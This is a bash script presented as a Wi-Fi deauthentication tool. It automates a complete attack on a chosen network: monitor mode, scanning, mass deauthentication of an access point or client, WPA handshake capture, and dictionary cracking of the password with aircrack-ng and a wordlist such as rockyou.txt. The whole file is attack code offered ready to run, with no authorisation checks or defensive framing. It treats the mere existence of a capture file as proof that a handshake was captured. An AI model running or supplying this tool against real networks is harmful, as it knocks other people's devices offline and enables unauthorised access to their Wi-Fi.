#!/bin/bash

echo "======================================"
echo "      Wi-Fi Deauthentication Tool     "
echo "         with Handshake Capture       "
echo "======================================"

# Ensure running as root
if [[ $EUID -ne 0 ]]; then
    echo "[!] This script must be run as root!"
    exit 1
fi

# Check if required tools are installed
command -v airmon-ng >/dev/null 2>&1 || { echo >&2 "[!] airmon-ng not found! Install aircrack-ng."; exit 1; }
command -v airodump-ng >/dev/null 2>&1 || { echo >&2 "[!] airodump-ng not found! Install aircrack-ng."; exit 1; }
command -v aireplay-ng >/dev/null 2>&1 || { echo >&2 "[!] aireplay-ng not found! Install aircrack-ng."; exit 1; }

# List available Wi-Fi interfaces
echo "[+] Available wireless interfaces:"
iw dev | awk '$1=="Interface"{print $2}'
echo "--------------------------------------"

# Select the interface
read -p "[*] Enter your wireless interface (e.g., wlan0): " interface
echo "[+] Putting $interface into monitor mode..."
sudo airmon-ng start $interface

# Use monitor mode interface
mon_interface="${interface}mon"

# Scan for networks
echo "[+] Scanning for nearby Wi-Fi networks..."
sudo timeout 10 airodump-ng $mon_interface

# Ask for the target network
read -p "[*] Enter target Wi-Fi BSSID: " bssid
read -p "[*] Enter target Wi-Fi Channel: " channel

# Get the target network name (SSID) for the folder name
read -p "[*] Enter the SSID of the target Wi-Fi network: " ssid

# Format the folder name (e.g., capture_NetworkName_YYYYMMDD_HHMMSS)
current_date=$(date +"%Y%m%d_%H%M%S")
folder_name="capture_${ssid}_${current_date}"

# Create the folder to store capture files
mkdir -p "$folder_name"

# Start capturing packets to find connected clients
echo "[+] Searching for clients connected to $bssid on channel $channel..."
sudo timeout 10 airodump-ng --bssid $bssid -c $channel --write "$folder_name/capture" $mon_interface

# Show clients
echo "[+] Captured clients:"
cat "$folder_name/capture-01.csv" 2>/dev/null | awk -F, '{print $1}' | grep -oE "([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}" | tail -n +2 | nl
read -p "[*] Enter target Client MAC (leave blank for all): " client_mac

# Perform the Deauth Attack and Capture the Handshake
echo "[+] Launching Deauth Attack to capture handshake on $bssid..."

# Start deauthentication attack in background
if [[ -z "$client_mac" ]]; then
    sudo aireplay-ng --deauth 1000 -a $bssid $mon_interface &
else
    sudo aireplay-ng --deauth 1000 -a $bssid -c $client_mac $mon_interface &
fi

# Capture the PID of the deauth attack process
deauth_pid=$!

# Start airodump-ng in background to capture handshake
sudo airodump-ng --bssid $bssid -c $channel --write "$folder_name/capture" $mon_interface &

# Use a trap to ensure cleanup when stopping deauth
trap "echo '[+] Stopping deauth attack...'; kill $deauth_pid; break" SIGINT

# Wait for the user to press a key to stop deauth packets
echo "[*] Press 'CTRL+C' to stop sending deauth packets and move to the next step."

# Wait for the deauth attack to finish
wait $deauth_pid

# Check if handshake was captured
echo "[+] Waiting for handshake to be captured..."
while [ ! -f "$folder_name/capture-01.cap" ]; do
    sleep 1
done

# If handshake is found, display a message
if [ -f "$folder_name/capture-01.cap" ]; then
    echo "[+] Handshake captured successfully! Saving the capture file as $folder_name/capture-01.cap"
else
    echo "[!] No handshake captured. Exiting..."
    exit 1
fi

# Prompt the user to input the path to the wordlist
read -p "[*] Enter the path to your wordlist file (e.g., /usr/share/wordlists/rockyou.txt): " wordlist

# Check if the wordlist exists
if [[ ! -f "$wordlist" ]]; then
    echo "[!] Wordlist file does not exist. Exiting..."
    exit 1
fi

# Proceed to crack the WPA password (using aircrack-ng)
echo "[+] Cracking WPA password using aircrack-ng with wordlist $wordlist..."
aircrack-ng "$folder_name/capture-01.cap" -w "$wordlist"

# Cleanup
echo "[+] Stopping monitor mode..."
sudo airmon-ng stop $mon_interface
echo "[+] Done!"
